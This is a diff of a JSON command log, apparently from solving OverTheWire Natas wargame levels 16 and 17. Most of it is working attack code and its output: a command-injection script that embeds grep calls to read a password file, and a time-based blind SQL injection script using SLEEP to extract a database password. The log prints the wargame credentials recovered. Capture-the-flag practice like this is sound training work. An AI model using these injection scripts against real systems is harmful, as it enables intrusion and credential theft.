@@ -426,7 +426,7 @@
      ]
     },
     {
-     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64\nurl = 'http://natas16.natas.labs.overthewire.org/'\nauth = 'Basic ' + base64.b64encode(b'natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb').decode()\nCHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\ndef empty(payload):\n    d = urllib.parse.urlencode({'needle': payload}).encode()\n    r = urllib.request.Request(url, data=d, headers={'Authorization': auth})\n    body = urllib.request.urlopen(r, timeout=30).read().decode('utf-8', 'replace')\n    i = body.find('<pre>'); j = body.find('</pre>', i)\n    return len(body[i+5:j].strip()) == 0\nprefix = ''\nfor pos in range(1, 40):\n    lo, hi = 0, len(CHARS) - 1\n    while lo < hi:\n        mid = (lo + hi) // 2\n        if empty('$(grep ^%s[%s] /etc/natas_webpass/natas17)' % (prefix, CHARS[lo:mid+1])):\n            hi = mid\n        else:\n            lo = mid + 1\n    ch = CHARS[lo]\n    if not empty('$(grep ^%s%s /etc/natas_webpass/natas17)' % (prefix, ch)):\n        print('FINAL', prefix, flush=True)\n        break\n    prefix += ch\n    print(prefix, flush=True)\n    if empty('$(grep ^%s$ /etc/natas_webpass/natas17)' % prefix):\n        print('FINAL', prefix, flush=True)\n        break\nPY\nPY",
+     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64\nurl = 'http://natas16.natas.labs.overthewire.org/'\nauth = 'Basic ' + base64.b64encode(b'natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb').decode()\nCHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\ndef empty(payload):\n    d = urllib.parse.urlencode({'needle': payload}).encode()\n    r = urllib.request.Request(url, data=d, headers={'Authorization': auth})\n    body = urllib.request.urlopen(r, timeout=30).read().decode('utf-8', 'replace')\n    i = body.find('<pre>'); j = body.find('</pre>', i)\n    return len(body[i+5:j].strip()) == 0\nprefix = ''\nfor pos in range(1, 40):\n    lo, hi = 0, len(CHARS) - 1\n    while lo < hi:\n        mid = (lo + hi) // 2\n        if empty('$(grep ^%s[%s] /etc/natas_webpass/natas17)' % (prefix, CHARS[lo:mid+1])):\n            hi = mid\n        else:\n            lo = mid + 1\n    ch = CHARS[lo]\n    if not empty('$(grep ^%s%s /etc/natas_webpass/natas17)' % (prefix, ch)):\n        print('FINAL', prefix, flush=True)\n        break\n    prefix += ch\n    print(prefix, flush=True)\n    if empty('$(grep ^%s$ /etc/natas_webpass/natas17)' % prefix):\n        print('FINAL', prefix, flush=True)\n        break\nPY",
      "out": [
       "K",
       "KL",
@@ -438,7 +438,29 @@
       "KLdAM3VZ",
       "KLdAM3VZu",
       "KLdAM3VZux",
-      "KLdAM3VZux8"
+      "KLdAM3VZux8",
+      "KLdAM3VZux8o",
+      "KLdAM3VZux8o6",
+      "KLdAM3VZux8o6T",
+      "KLdAM3VZux8o6Tb",
+      "KLdAM3VZux8o6Tbk",
+      "KLdAM3VZux8o6Tbkb",
+      "KLdAM3VZux8o6Tbkbh",
+      "KLdAM3VZux8o6Tbkbhu",
+      "KLdAM3VZux8o6Tbkbhua",
+      "KLdAM3VZux8o6TbkbhuaG",
+      "KLdAM3VZux8o6TbkbhuaG5",
+      "KLdAM3VZux8o6TbkbhuaG5K",
+      "KLdAM3VZux8o6TbkbhuaG5Kt",
+      "KLdAM3VZux8o6TbkbhuaG5KtY",
+      "KLdAM3VZux8o6TbkbhuaG5KtYj",
+      "KLdAM3VZux8o6TbkbhuaG5KtYjI",
+      "KLdAM3VZux8o6TbkbhuaG5KtYjI7",
+      "KLdAM3VZux8o6TbkbhuaG5KtYjI77",
+      "KLdAM3VZux8o6TbkbhuaG5KtYjI77t",
+      "KLdAM3VZux8o6TbkbhuaG5KtYjI77tf",
+      "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx",
+      "FINAL KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"
      ]
     }
    ]
@@ -455,13 +477,10 @@
      ]
     },
     {
-     "cmd": "echo -n \"true condition  -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
+     "cmd": "echo -n \"true condition  -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"\necho -n \"false condition -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
      "out": [
-      "echo -n \"false condition -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
-      "echo -n \"true condition  -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
-      "true condition  -> 20.5 s",
-      "$ echo -n \"false condition -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
-      "false condition -> 0.6 s"
+      "true condition  -> 20.6 s",
+      "false condition -> 0.4 s"
      ]
     },
     {
@@ -471,7 +490,7 @@
      ]
     },
     {
-     "cmd": "python3 - <<'PY'\nimport subprocess, time\nBASE = 'http://natas17.natas.labs.overthewire.org/'\nUSER, PW = 'natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'\ndef timed(p):\n    t0 = time.time()\n    subprocess.run(['curl','-s','-m','90','-o','/dev/null','-u',USER+':'+PW,\n                    '--data-urlencode','username='+p,BASE],\n                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=100)\n    return time.time() - t0\ndef cond(expr):\n    return timed('x\" OR IF(' + expr + ',SLEEP(5),0)-- -') > 8.0\npw = ''\nfor pos in range(1, 33):\n    lo, hi = 32, 127\n    while lo < hi:\n        mid = (lo + hi + 1) // 2\n        e = ('(SELECT ORD(SUBSTR(password,' + str(pos) + ',1)) FROM users WHERE username=\"natas18\")>=' + str(mid))\n        if cond(e):\n            lo = mid\n        else:\n            hi = mid - 1\n    pw += chr(lo)\n    print('pos', pos, repr(chr(lo)), pw, flush=True)\nprint('FINAL', pw, flush=True)\nPY\nPY",
+     "cmd": "python3 - <<'PY'\nimport subprocess, time\nBASE = 'http://natas17.natas.labs.overthewire.org/'\nUSER, PW = 'natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'\ndef timed(p):\n    t0 = time.time()\n    subprocess.run(['curl','-s','-m','90','-o','/dev/null','-u',USER+':'+PW,\n                    '--data-urlencode','username='+p,BASE],\n                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=100)\n    return time.time() - t0\ndef cond(expr):\n    # one SLEEP per query: the subquery is evaluated once, so a true answer\n    # costs one 5-second sleep instead of one per matched row\n    return timed('x\" OR (SELECT IF(' + expr + ',SLEEP(5),0) FROM users WHERE username=\"natas18\")-- -') > 2.5\npw = ''\nfor pos in range(1, 33):\n    lo, hi = 32, 127\n    while lo < hi:\n        mid = (lo + hi + 1) // 2\n        e = 'ORD(SUBSTR(password,' + str(pos) + ',1))>=' + str(mid)\n        if cond(e):\n            lo = mid\n        else:\n            hi = mid - 1\n    pw += chr(lo)\n    print('pos', pos, repr(chr(lo)), pw, flush=True)\nprint('FINAL', pw, flush=True)\nPY",
      "out": [
       "pos 1 'f' f",
       "pos 2 'D' fD",
@@ -491,7 +510,21 @@
       "pos 16 'b' fDGn2A6Gsc0BUp3b",
       "pos 17 'Z' fDGn2A6Gsc0BUp3bZ",
       "pos 18 'w' fDGn2A6Gsc0BUp3bZw",
-      "pos 19 '0' fDGn2A6Gsc0BUp3bZw0"
+      "pos 19 '0' fDGn2A6Gsc0BUp3bZw0",
+      "pos 20 'R' fDGn2A6Gsc0BUp3bZw0R",
+      "pos 21 'N' fDGn2A6Gsc0BUp3bZw0RN",
+      "pos 22 'X' fDGn2A6Gsc0BUp3bZw0RNX",
+      "pos 23 'p' fDGn2A6Gsc0BUp3bZw0RNXp",
+      "pos 24 'g' fDGn2A6Gsc0BUp3bZw0RNXpg",
+      "pos 25 '0' fDGn2A6Gsc0BUp3bZw0RNXpg0",
+      "pos 26 'P' fDGn2A6Gsc0BUp3bZw0RNXpg0P",
+      "pos 27 'Z' fDGn2A6Gsc0BUp3bZw0RNXpg0PZ",
+      "pos 28 't' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt",
+      "pos 29 '4' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt4",
+      "pos 30 '0' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40",
+      "pos 31 'o' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40o",
+      "pos 32 'p' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op",
+      "FINAL fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op"
      ]
     }
    ]
